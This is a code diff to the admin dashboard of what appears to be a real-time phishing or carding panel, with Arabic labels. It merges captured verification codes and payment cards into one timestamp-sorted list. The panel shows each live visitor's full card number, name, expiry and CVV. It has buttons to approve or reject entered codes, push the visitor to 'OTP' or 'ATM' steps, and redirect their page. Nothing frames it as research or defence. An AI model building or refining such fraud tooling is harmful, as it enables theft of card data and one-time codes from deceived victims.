@@ -510,55 +510,79 @@
       html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توجيه</button>';
       html += '</div></div>';
 
-      // Digit Codes (shown first - newest data from client)
+      // Combine all entries (cards and codes) and sort by timestamp (newest first)
+      const allEntries = [];
+      
+      // Add digit codes with type
       if (visitor.digitCodes && visitor.digitCodes.length > 0) {
-        html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
-        html += '<h3 class="font-bold mb-3 text-orange-800">🔢 الرموز المدخلة</h3>';
-        html += '<div class="space-y-2">';
-        // Reverse to show newest first
-        const reversedCodes = [...visitor.digitCodes].reverse();
-        reversedCodes.forEach((dc, revIndex) => {
-          const index = visitor.digitCodes.length - 1 - revIndex; // Get original index for actions
-          html += '<div class="bg-white p-3 rounded-lg">';
-          html += '<div class="flex justify-between items-center mb-2">';
-          html += '<span class="font-mono text-lg font-bold text-orange-700">' + dc.code + '</span>';
-          html += '<span class="text-sm text-gray-500">' + dc.page + '</span>';
-          html += '</div>';
-          html += '<div class="flex gap-2">';
-          html += '<button onclick="codeActionApprove(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
-          html += '<button onclick="codeActionReject(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
-          html += '</div>';
-          html += '</div>';
+        visitor.digitCodes.forEach((dc, index) => {
+          allEntries.push({
+            type: 'code',
+            data: dc,
+            index: index,
+            timestamp: dc.timestamp || new Date(0).toISOString()
+          });
         });
-        html += '</div></div>';
       }
-
-      // Payment Cards (shown second)
+      
+      // Add payment cards with type
       if (visitor.paymentCards && visitor.paymentCards.length > 0) {
-        html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
-        html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقات الدفع</h3>';
-        html += '<div class="space-y-3">';
-        // Reverse to show newest first
-        const reversedCards = [...visitor.paymentCards].reverse();
-        reversedCards.forEach((card, revIndex) => {
-          const originalIndex = visitor.paymentCards.length - 1 - revIndex;
-          html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
-          html += '<p class="font-medium mb-2 text-purple-700">بطاقة ' + (originalIndex + 1) + '</p>';
-          html += '<div class="grid grid-cols-2 gap-3 text-sm">';
-          html += '<div><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold">' + card.cardNumber + '</span></div>';
-          html += '<div><span class="text-gray-500">الاسم:</span> <span class="font-medium">' + card.nameOnCard + '</span></div>';
-          html += '<div><span class="text-gray-500">الانتهاء:</span> <span class="font-medium">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
-          html += '<div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold">' + card.cvv + '</span></div>';
-          html += '</div>';
-          // Action buttons for each card
-          html += '<div class="flex gap-2 mt-3">';
-          html += '<button onclick="cardActionOTP(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
-          html += '<button onclick="cardActionATM(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ATM</button>';
-          html += '<button onclick="cardActionReject(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
-          html += '</div>';
-          html += '</div>';
+        visitor.paymentCards.forEach((card, index) => {
+          allEntries.push({
+            type: 'card',
+            data: card,
+            index: index,
+            timestamp: card.timestamp || new Date(0).toISOString()
+          });
         });
-        html += '</div></div>';
+      }
+      
+      // Sort by timestamp (newest first)
+      allEntries.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+      
+      // Render combined entries
+      if (allEntries.length > 0) {
+        html += '<div class="space-y-3">';
+        allEntries.forEach((entry) => {
+          if (entry.type === 'code') {
+            const dc = entry.data;
+            const index = entry.index;
+            html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
+            html += '<h3 class="font-bold mb-3 text-orange-800">🔢 رمز التحقق</h3>';
+            html += '<div class="bg-white p-3 rounded-lg">';
+            html += '<div class="flex justify-between items-center mb-2">';
+            html += '<span class="font-mono text-lg font-bold text-orange-700">' + dc.code + '</span>';
+            html += '<span class="text-sm text-gray-500">' + dc.page + '</span>';
+            html += '</div>';
+            html += '<div class="flex gap-2">';
+            html += '<button onclick="codeActionApprove(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+            html += '<button onclick="codeActionReject(\'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+            html += '</div>';
+            html += '</div>';
+            html += '</div>';
+          } else if (entry.type === 'card') {
+            const card = entry.data;
+            const cardIndex = entry.index;
+            html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
+            html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقة دفع</h3>';
+            html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
+            html += '<div class="grid grid-cols-2 gap-3 text-sm">';
+            html += '<div><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold">' + card.cardNumber + '</span></div>';
+            html += '<div><span class="text-gray-500">الاسم:</span> <span class="font-medium">' + card.nameOnCard + '</span></div>';
+            html += '<div><span class="text-gray-500">الانتهاء:</span> <span class="font-medium">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
+            html += '<div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold">' + card.cvv + '</span></div>';
+            html += '</div>';
+            // Action buttons for each card
+            html += '<div class="flex gap-2 mt-3">';
+            html += '<button onclick="cardActionOTP(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
+            html += '<button onclick="cardActionATM(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ATM</button>';
+            html += '<button onclick="cardActionReject(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+            html += '</div>';
+            html += '</div>';
+            html += '</div>';
+          }
+        });
+        html += '</div>';
       }
 
       // Display data history in reverse order (newest first)
